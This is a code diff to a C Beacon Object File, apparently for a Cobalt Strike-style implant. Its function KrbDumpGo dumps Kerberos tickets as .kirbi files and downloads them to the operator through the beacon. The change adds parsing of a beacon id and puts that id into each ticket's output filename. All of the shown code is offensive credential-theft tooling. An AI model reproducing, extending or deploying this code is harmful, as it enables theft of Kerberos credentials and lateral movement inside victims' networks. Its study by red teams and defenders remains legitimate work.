@@ -34,8 +34,10 @@ typedef struct
 VOID KrbDumpGo( _In_ PVOID Argv, _In_ INT Argc )
 {
 	API					Api;
+	datap					Psr;
 	ANSI_STRING				Ani;
 
+	ULONG					Bid = 0;
 	ULONG					Kid = 0;
 	ULONG					RLn = 0;
 	NTSTATUS				Pst = STATUS_SUCCESS;
@@ -51,7 +53,12 @@ VOID KrbDumpGo( _In_ PVOID Argv, _In_ INT Argc )
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
+	RtlSecureZeroMemory( &Psr, sizeof( Psr ) );
 	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
+
+	/* Extract arguments */
+	BeaconDataParse( &Psr, Argv, Argc );
+	Bid = BeaconDataInt( &Psr );
 
 	/* Reference ntdll.dll */
 	Ntl = LoadLibraryA( "ntdll.dll" );
@@ -120,12 +127,13 @@ VOID KrbDumpGo( _In_ PVOID Argv, _In_ INT Argc )
 
 													/* Create output filename */
 													if ( BufferPrintf( Out, 
-															   "%u-%08x-%wZ@%wZ-%wZ.kirbi\0", 
+															   "beacon-%u-%u-%08x-%wZ@%wZ-%wZ.kirbi\0", 
+															   Bid,
 															   Idx, 
 															   Res->Tickets[ Idx ].TicketFlags, 
 															   Res->Tickets[ Idx ].ClientName, 
 															   Res->Tickets[ Idx ].ServerName, 
-															   Res->Tickets[ Idx ].ServerRealm 
+															   Res->Tickets[ Idx ].ServerRealm
 													) ) 
 													{
 														/* Download the ticket! */
@@ -166,5 +174,6 @@ VOID KrbDumpGo( _In_ PVOID Argv, _In_ INT Argc )
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
+	RtlSecureZeroMemory( &Psr, sizeof( Psr ) );
 	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
 };
